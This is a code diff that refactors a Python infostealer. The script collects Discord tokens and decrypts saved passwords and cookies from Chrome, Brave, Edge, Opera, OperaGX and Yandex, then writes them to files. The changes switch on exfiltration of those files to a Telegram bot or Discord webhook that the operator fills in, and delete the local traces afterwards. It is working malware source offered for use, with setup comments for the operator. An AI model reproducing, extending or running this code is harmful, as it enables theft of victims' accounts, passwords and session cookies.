@@ -8,6 +8,29 @@ from shutil import copy2
 from requests import post, get
 import re
 
+
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+        
+tokenPaths = {
+    'Discord': roaming + '\\Discord',
+    'Discord Canary': roaming + '\\discordcanary',
+    'Discord PTB': roaming + '\\discordptb',
+    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+    'Opera': roaming + '\\Opera Software\\Opera Stable',
+    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'OperaGX' : roaming + '\\Opera Software\\Opera GX Stable'
+}
+
+browser_loc = {
+    "Chrome" : local + "\\Google\\Chrome",
+    "Brave" : local + "\\BraveSoftware\\Brave-Browser",
+    "Edge" : local + "\\Microsoft\\Edge",
+    "Opera" : roaming + "\\Opera Software\\Opera Stable",
+    "OperaGX" : roaming + "\\Opera Software\\Opera GX Stable"
+}
+
 fileCookies = "cooks_"+ os.getlogin()+ ".txt"
 filePass = "passes_"+ os.getlogin()+ ".txt"
 fileInfo = "info_" + os.getlogin()+ ".txt"
@@ -180,21 +203,9 @@ def Cookies(path):
     Cookies = path + "\\User Data\\Default\\Network\\Cookies"
     return Cookies
 
-local = os.getenv('LOCALAPPDATA')
-roaming = os.getenv('APPDATA')
-        
-paths = {
-    'Discord': roaming + '\\Discord',
-    'Discord Canary': roaming + '\\discordcanary',
-    'Discord PTB': roaming + '\\discordptb',
-    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-    'Opera': roaming + '\\Opera Software\\Opera Stable',
-    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-}
 
 def main_tokens():
-    for platform, path in paths.items():
+    for platform, path in tokenPaths.items():
         if not os.path.exists(path):
             continue
         try:
@@ -208,92 +219,60 @@ def main_tokens():
                 f.write(str(i) + "\n")
             f.close()
 main_tokens()
-#CHROME
-pathChrome = os.environ['LOCALAPPDATA'] + "\\Google\\Chrome"
 
-if os.path.exists(pathChrome):
-    decrypt_browser(Local_State(pathChrome), Login_Data(pathChrome), Cookies(pathChrome), "Chrome") 
-else:
-    f = open(fileInfo,"a")
-    f.write("Chrome not installed\n")
-    f.close()
+
+def decrypt_files(path, browser):
+
+    if os.path.exists(path):
+        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser) 
+    else:
+        f = open(fileInfo,"a")
+        f.write(browser + " not installed\n")
+        f.close()
         
-
-
-#BRAVE
-pathBrave = os.environ['LOCALAPPDATA'] + "\\BraveSoftware\\Brave-Browser"
-
-if os.path.exists(pathBrave):
-    decrypt_browser(Local_State(pathBrave), Login_Data(pathBrave), Cookies(pathBrave), "Brave") 
-else:
-    f = open(fileInfo,"a")
-    f.write("Brave not installed\n")
-    f.close()
-
-
-
-#EDGE
-pathEdge = os.environ['LOCALAPPDATA'] + "\\Microsoft\\Edge"
-
-if os.path.exists(pathEdge):
-    decrypt_browser(Local_State(pathEdge), Login_Data(pathEdge), Cookies(pathEdge), "Edge") 
-else:
-    f = open(fileInfo,"a")
-    f.write("Edge not installed\n")
-    f.close()
-
-
-
-#OPERA
-pathOpera = os.environ['APPDATA'] + "\\Opera Software\\Opera Stable"
-
-if os.path.exists(pathOpera):
-    decrypt_browser(pathOpera + "\\Local State", pathOpera + "\\Login Data", pathOpera + "\\Network\\Cookies", "Opera") 
-else:
-    f = open(fileInfo,"a")
-    f.write("Opera not installed\n")
-    f.close()
-
-
-#OPERAGX
-pathOperaGX = os.environ['APPDATA'] + "\\Opera Software\\Opera GX Stable"
-
-if os.path.exists(pathOperaGX):
-    decrypt_browser(pathOperaGX + "\\Local State", pathOperaGX + "\\Login Data", pathOperaGX + "\\Cookies", "OperaGX") 
-else:
-    f = open(fileInfo,"a")
-    f.write("OperaGX not installed\n")
-    f.close()
+for name, path in browser_loc.items():
+       decrypt_files(path, name) 
 
 
 ###WEBHOOK
 
 
 def post_to(file):
-    token = "TELEGRAM TOKEN"
-    chatid = "TELEGRAM CHATID"
-    webhookurl = "WEBHOOK URL"
-    #remove "#" for whatever you wanna use   telegram api or discord webhook
-    #post("https://api.telegram.org/bot" + token + "/sendDocument", data={'chat_id': chatid}, files={'document': open(file, 'rb')})
-    #post(webhookurl, files={'files': open(file,'rb')})
-
-if os.path.exists(fileInfo):
-    post_to(fileInfo)
+    token = "TELEGRAM TOKEN"    #put your token in here, if you don't wanna use telegram leave it like it is
+    chatid = "TELEGRAM CHATID"  #    "    chatid          "                     telegram      "      
+    webhookurl = "WEBHOOK URL"  #    "    webhook         "                     discord       "      
+    #if you don't understand it you shouldn't use it
     
-if os.path.exists(filePass):
-    post_to(filePass)
     
-if os.path.exists(fileCookies):
-    post_to(fileCookies)
-###
+    if token == "TELEGRAM TOKEN": #don't change
+        pass
+    else:
+        if chatid == "TELEGRAM CHATID": #don't change
+            pass
+        else:
+            post("https://api.telegram.org/bot" + token + "/sendDocument", data={'chat_id': chatid}, files={'document': open(file, 'rb')})
+
+    if webhookurl == "WEBHOOK URL": #don't change
+        pass
+    else:
+        post(webhookurl, files={'files': open(file,'rb')})
 
 
-if os.path.exists(fileInfo):
-    os.remove(fileInfo)
-if os.path.exists(filePass):
-    os.remove(filePass)
-if os.path.exists(fileCookies):
-    os.remove(fileCookies)
+forHandler = (
+    fileInfo,
+    filePass,
+    fileCookies,
+    "TempMan.db",
+    "CookMe.db"
+)
 
-os.remove("TempMan.db")
-os.remove("CookMe.db")
+def fileHandler(file):
+    if os.path.exists(file):
+        if ".txt" in file:
+            post_to(file)
+        os.remove(file)
+
+for i in forHandler:
+    fileHandler(i)
+
+###end
